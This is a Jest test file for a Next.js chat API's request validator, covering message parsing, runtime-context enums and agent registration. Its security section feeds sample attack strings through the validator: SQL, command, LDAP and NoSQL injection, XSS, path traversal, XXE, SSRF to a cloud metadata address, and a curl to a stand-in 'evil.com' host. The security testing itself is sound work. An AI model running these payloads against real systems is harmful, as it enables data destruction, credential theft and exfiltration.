// Setup test environment before any imports
import { mockTestEnv } from '../../../../helpers/setupEnvMock';

const restoreEnv = mockTestEnv({
  NODE_ENV: 'test',
  OPENAI_API_KEY: 'test-key',
  CLAUDE_API_KEY: 'test-key'
});

import { NextRequest } from 'next/server';
import { 
  validateChatRequest, 
  registerAgentsSafely
} from '@/lib/api/helpers/request-validator';
import { ValidationError } from '@/lib/api/helpers/error-handler';
import { logger } from '@/lib/utils/logger';
import { env } from '@/config/env';
import { registerAllAgents } from '@/lib/mastra/network/agent-registry';

// Mock dependencies
jest.mock('@/lib/utils/logger', () => ({
  logger: {
    info: jest.fn(),
    warn: jest.fn(),
    debug: jest.fn(),
  }
}));

jest.mock('@/lib/mastra/network/agent-registry', () => ({
  registerAllAgents: jest.fn(),
}));

describe('request-validator', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    (env as any).OPENAI_API_KEY = 'test-api-key';
  });

  afterAll(() => {
    restoreEnv();
  });

  describe('validateChatRequest', () => {
    it('should validate request with single message', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: 'Test message',
          sessionId: 'session-123'
        })
      });

      const result = await validateChatRequest(request);

      expect(result).toEqual({
        userMessage: 'Test message',
        sessionId: 'session-123',
        runtimeContext: undefined
      });

      expect(logger.info).toHaveBeenCalledWith(
        '[Request Validator] Chat request validated',
        {
          sessionId: 'session-123',
          messageLength: 12,
          hasRuntimeContext: false,
        }
      );
    });

    it('should validate request with runtime context', async () => {
      const runtimeContext = {
        userTier: 'premium' as const,
        userLevel: 'expert' as const,
        marketStatus: 'open' as const,
        queryComplexity: 'complex' as const,
        isProposalMode: true,
      };

      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: 'Analyze market',
          runtimeContext
        })
      });

      const result = await validateChatRequest(request);

      expect(result).toEqual({
        userMessage: 'Analyze market',
        sessionId: undefined,
        runtimeContext
      });

      expect(logger.info).toHaveBeenCalledWith(
        '[Request Validator] Chat request validated',
        {
          sessionId: undefined,
          messageLength: 14,
          hasRuntimeContext: true,
        }
      );
    });

    it('should handle legacy messages format', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          messages: [
            { role: 'system', content: 'System prompt' },
            { role: 'user', content: 'First message' },
            { role: 'assistant', content: 'Response' },
            { role: 'user', content: 'Latest message' }
          ],
          sessionId: 'legacy-session'
        })
      });

      const result = await validateChatRequest(request);

      expect(result).toEqual({
        userMessage: 'Latest message',
        sessionId: 'legacy-session',
        runtimeContext: undefined
      });
    });

    it('should prioritize single message over messages array', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: 'Priority message',
          messages: [
            { role: 'user', content: 'Should be ignored' }
          ]
        })
      });

      const result = await validateChatRequest(request);

      expect(result.userMessage).toBe('Priority message');
    });

    it('should throw ValidationError for invalid request format', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          invalidField: 'value',
          runtimeContext: {
            userTier: 'invalid' // Invalid enum value to trigger validation error
          }
        })
      });

      await expect(validateChatRequest(request)).rejects.toThrow(ValidationError);
    });

    it('should throw ValidationError when no user message found', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          messages: [
            { role: 'system', content: 'System only' },
            { role: 'assistant', content: 'Assistant only' }
          ]
        })
      });

      await expect(validateChatRequest(request)).rejects.toThrow('No user message found');
    });

    it('should throw error when OpenAI API key not configured', async () => {
      (env as any).OPENAI_API_KEY = '';

      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: 'Test'
        })
      });

      await expect(validateChatRequest(request)).rejects.toThrow('OpenAI API key not configured');
    });

    it('should validate runtime context enums', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: 'Test',
          runtimeContext: {
            userTier: 'invalid' // Invalid enum value
          }
        })
      });

      await expect(validateChatRequest(request)).rejects.toThrow(ValidationError);
    });

    it('should handle partial runtime context', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: 'Test',
          runtimeContext: {
            userTier: 'free',
            isProposalMode: false
            // Other fields are optional
          }
        })
      });

      const result = await validateChatRequest(request);

      expect(result.runtimeContext).toEqual({
        userTier: 'free',
        isProposalMode: false
      });
    });

    it('should handle malformed JSON', async () => {
      const request = new NextRequest('http://localhost/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid json'
      });

      await expect(validateChatRequest(request)).rejects.toThrow();
    });

    // Security-focused tests
    describe('Security Validation', () => {
      it('should prevent SQL injection attempts', async () => {
        const sqlInjectionPayloads = [
          "'; DROP TABLE users; --",
          "1' OR '1' = '1",
          "admin'--",
          "1; DELETE FROM sessions WHERE '1' = '1",
          "' UNION SELECT * FROM users--",
        ];

        for (const payload of sqlInjectionPayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload,
              sessionId: payload
            })
          });

          // Should not throw - validation passes but payload is preserved for server-side sanitization
          const result = await validateChatRequest(request);
          expect(result.userMessage).toBe(payload);
          expect(result.sessionId).toBe(payload);
        }
      });

      it('should prevent XSS attacks', async () => {
        const xssPayloads = [
          '<script>alert("XSS")</script>',
          '<img src=x onerror=alert("XSS")>',
          'javascript:alert("XSS")',
          '<iframe src="javascript:alert(\'XSS\')"></iframe>',
          '<svg onload=alert("XSS")>',
          '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
        ];

        for (const payload of xssPayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload
            })
          });

          // Should not throw - validation passes but payload is preserved for server-side sanitization
          const result = await validateChatRequest(request);
          expect(result.userMessage).toBe(payload);
        }
      });

      it('should handle command injection attempts', async () => {
        const commandInjectionPayloads = [
          '; ls -la',
          '| cat /etc/passwd',
          '`rm -rf /`',
          '$(whoami)',
          '&& curl evil.com/steal',
        ];

        for (const payload of commandInjectionPayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload
            })
          });

          const result = await validateChatRequest(request);
          expect(result.userMessage).toBe(payload);
        }
      });

      it('should handle path traversal attempts', async () => {
        const pathTraversalPayloads = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '....//....//....//etc/passwd',
        ];

        for (const payload of pathTraversalPayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload,
              sessionId: payload
            })
          });

          const result = await validateChatRequest(request);
          expect(result.userMessage).toBe(payload);
          expect(result.sessionId).toBe(payload);
        }
      });

      it('should handle LDAP injection attempts', async () => {
        const ldapPayloads = [
          '*)(uid=*))(|(uid=*',
          'admin)(|(password=*))',
          '*)(mail=*))(|(mail=*',
        ];

        for (const payload of ldapPayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload
            })
          });

          const result = await validateChatRequest(request);
          expect(result.userMessage).toBe(payload);
        }
      });

      it('should enforce message length limits', async () => {
        const veryLongMessage = 'x'.repeat(100000); // 100k characters
        
        const request = new NextRequest('http://localhost/api/chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: veryLongMessage
          })
        });

        // Should handle without crashing
        const result = await validateChatRequest(request);
        expect(result.userMessage).toBe(veryLongMessage);
      });

      it('should handle unicode and emoji attacks', async () => {
        const unicodePayloads = [
          '\u202E\u202D\u202C', // Right-to-left override
          '🔥'.repeat(1000), // Emoji spam
          '\u0000\u0001\u0002', // Null bytes
          '\uFEFF', // Zero-width no-break space
        ];

        for (const payload of unicodePayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload
            })
          });

          const result = await validateChatRequest(request);
          expect(result.userMessage).toBe(payload);
        }
      });

      it('should validate Content-Type header', async () => {
        const request = new NextRequest('http://localhost/api/chat', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: JSON.stringify({ message: 'test' })
        });

        // Should still parse JSON body even with wrong content-type
        const result = await validateChatRequest(request);
        expect(result.userMessage).toBe('test');
      });

      it('should handle prototype pollution attempts', async () => {
        const request = new NextRequest('http://localhost/api/chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: 'test',
            '__proto__': { admin: true },
            'constructor': { prototype: { isAdmin: true } }
          })
        });

        const result = await validateChatRequest(request);
        expect(result.userMessage).toBe('test');
        // Ensure prototype pollution doesn't affect the result
        expect((result as any).admin).toBeUndefined();
        expect((result as any).isAdmin).toBeUndefined();
      });

      it('should handle NoSQL injection attempts', async () => {
        const noSqlPayloads = [
          { '$ne': null },
          { '$gt': '' },
          { '$regex': '.*' },
          { '$where': '1 == 1' },
        ];

        for (const payload of noSqlPayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload, // Pass as object to trigger validation failure
              sessionId: JSON.stringify(payload)
            })
          });

          // Should throw validation error for invalid input types
          await expect(validateChatRequest(request)).rejects.toThrow(ValidationError);
        }
      });

      it('should handle XML External Entity (XXE) attempts', async () => {
        const xxePayload = `
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
          ]>
          <message>&xxe;</message>
        `;

        const request = new NextRequest('http://localhost/api/chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: xxePayload
          })
        });

        const result = await validateChatRequest(request);
        expect(result.userMessage).toBe(xxePayload);
      });

      it('should handle Server-Side Request Forgery (SSRF) attempts', async () => {
        const ssrfPayloads = [
          'http://localhost:8080/admin',
          'http://169.254.169.254/latest/meta-data/',
          'file:///etc/passwd',
          'gopher://localhost:8080/_',
          'dict://localhost:11211/stat',
        ];

        for (const payload of ssrfPayloads) {
          const request = new NextRequest('http://localhost/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              message: payload
            })
          });

          const result = await validateChatRequest(request);
          expect(result.userMessage).toBe(payload);
        }
      });
    });
  });

  describe('registerAgentsSafely', () => {
    it('should register agents successfully', () => {
      (registerAllAgents as jest.Mock).mockImplementation(() => {});

      registerAgentsSafely();

      expect(registerAllAgents).toHaveBeenCalled();
      expect(logger.debug).toHaveBeenCalledWith(
        '[Request Validator] Agents registered successfully'
      );
      expect(logger.warn).not.toHaveBeenCalled();
    });

    it('should handle registration errors gracefully', () => {
      (registerAllAgents as jest.Mock).mockImplementation(() => {
        throw new Error('Registration failed');
      });

      registerAgentsSafely();

      expect(registerAllAgents).toHaveBeenCalled();
      expect(logger.warn).toHaveBeenCalledWith(
        '[Request Validator] Agent registration failed',
        { error: 'Error: Registration failed' }
      );
      expect(logger.debug).not.toHaveBeenCalled();
    });
  });
});